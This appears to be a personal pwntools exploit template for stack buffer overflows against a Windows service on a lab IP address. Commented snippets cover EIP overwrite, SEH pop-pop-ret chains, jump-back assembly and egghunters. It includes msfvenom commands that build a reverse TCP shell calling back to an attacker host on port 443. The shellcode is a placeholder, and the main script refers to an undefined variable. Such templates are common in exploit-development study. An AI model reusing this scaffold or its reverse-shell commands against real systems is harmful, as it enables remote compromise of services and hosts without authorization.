#!/usr/bin/python3

from pwn import *

# Target info
host = "192.168.145.129"
port = 9999
s = remote(host, port)

# Important variables
vulncmd = b"COMMAND" # this should cause the crash
crash = 3000 # a payload of this size triggers the crash

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.145.1 LPORT=443 -b "\x00" -f hex EXINTFUNC=thread
shellcode = binascii.unhexlify("HEXSHELLCODE")

payload = b"".join([
    vulncmd,
    junk
])

payload += b"C" * (crash - len(payload)) # padding

s.send(payload)
s.close()



# # ================================================
# # Copypasta. Copy relevant stuff and delete later
# # ================================================

# # === General ===
# nop_sled = b"90"*32 # just some NOPS to slide into her DMs.. I mean my shellcode

# # === EIP overwrite ===
# cyclic_pattern = str.encode(cyclic(4000,"123456789ABCDEF")) # generate cyclic pattern as byte array, alphanumeric only
# cyclic_pattern = cyclic_metasploit(4000) # metasploit version
# offset = 2047 # offset of EIP
# junk = b"A" * offset
# eip = b"BBBB" # To test if we successfully overwrite the EIP
# new_eip = p32(0x00000000) # address convert to little endian

# # === SEH ===
# nseh = p32(0x09eb9090)  # 2x noops, then jump 9 bytes to the next A (eb means JMP SHORT)
# seh = p32(0x625010b4)  # pop pop ret - find with !mona seh


# # === Jumping ===

# # Manual jump based on stack difference
# jumpback = asm("push esp; pop eax; add ax, 0x565; jmp eax;") # b'TXf\x05e\x05\xff\xe0'
# jumpback = b"\x54\x58\x66\x05\x65\x05\xff\xe0" # manual hand encoding from nasmshell - also working

# # === egghunter ===

# # !mona egg (-t EGGG) - defaults to w00t if tag not specified
# egghunter = (
    
# )
# shellcode = b"w00tw00t"  # egghunter tag
# shellcode +=  binascii.unhexlify("HEXSHELLCODE")

# # === Shellcode ===
# # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.145.1 LPORT=443 -b "\x00" -f hex EXINTFUNC=thread
# shellcode = binascii.unhexlify("HEXSHELLCODE")

# # traditional payload style
# # msfvenom -p windows/shell_reverse_tcp -b "\x00" lhost=192.168.145.1 lport=443 -f py -v shellcode EXINTFUNC=thread


